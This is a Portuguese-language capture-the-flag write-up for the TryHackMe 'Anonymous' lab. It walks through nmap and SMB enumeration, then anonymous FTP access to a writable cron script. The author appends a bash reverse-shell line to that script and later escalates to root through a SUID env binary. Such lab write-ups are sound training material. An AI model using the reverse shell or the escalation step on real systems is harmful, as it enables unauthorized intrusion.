---
title: THM - Anonymous
author: guialvesf
date: 2022-03-24 01:00:00 -0300
categories: [tryhackme, writeup]
tags: [tryhackme, writeup]
image: "/img/thm/anonymous/anonymous.png"
alt: "tryhackme"
---


![banner](/img/thm/anonymous/anonymous.png) 
<hr>

# Questões
* Enumerate the machine.  How many ports are open?
* What service is running on port 21?
* What service is running on ports 139 and 445?
* There's a share on the user's computer.  What's it called?
<br>

Temos quatro questões antes de pegar as flags de User e Root, então vamos começar enumerando a máquina para responder a primeira.

[Anonymous room](https://tryhackme.com/room/anonymous)

# Enumeration

Começando com o scan padrão do Nmap (que eu uso geralmente) `nmap -sC -sV -oA nmap -v $IP`.
* sC - Default nmap scripts
* sV - Open ports services/version
* oA - Save output to 'nmap' file
* v  - Verbose mode

Isso já foi o suficiente para responder as três primeiras questões.

![nmap](/img/thm/anonymous/nmap.png)


Para a quarta questão precisaremos executar outro scan com o Nmap, e como podemos ver há um Samba sendo executado no sistema então precisaremos enumerá-lo. 
`nmap --script smb-enum-shares.nse -p 445,139 -v -oA smb $IP`

![smb](/img/thm/anonymous/smbNmap.png)

Pronto, além da quarta questão respondida podemos acessar esse samba.
`smbclient \\\\$IP\\pics`

![smbclient](/img/thm/anonymous/smbclient.png)

Nada de interessante aqui, porém o servidor FTP está acessível para login anônimo

![ftp](/img/thm/anonymous/ftpFiles.png)

E aqui temos 3 arquivos:
* clean.sh
* removed_files.log
* to_do.txt

Olhando o arquivo de log, presumo que o script `clean.sh` está sendo executado a cada X minutos, então podemos ler o código fonte para ver o que está acontecendo.

![cleansh](/img/thm/anonymous/cleanSh.png)

Tendo a permissão de escrita no arquivo podemos enviar uma linha de código que irá executar o bash, que nos enviará uma conexão 
`bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1'`

![shell](/img/thm/anonymous/shell.png)

Agora precisamos enviar a saída para dentro do arquivo `clean.sh` usando o `append`

![append](/img/thm/anonymous/append.png)

Usando o netcat preciso apenas esperar a conexão ser estabelecida.

![user](/img/thm/anonymous/user.png)

Flag de usuário encontrada, então vamos para a escalação de privilégios. Para fazer isso usei o linPEAS e na saída vi que posso preciso apenas executar um comando. `/usr/bin/env /bin/sh -p`

![root](/img/thm/anonymous/root.png)
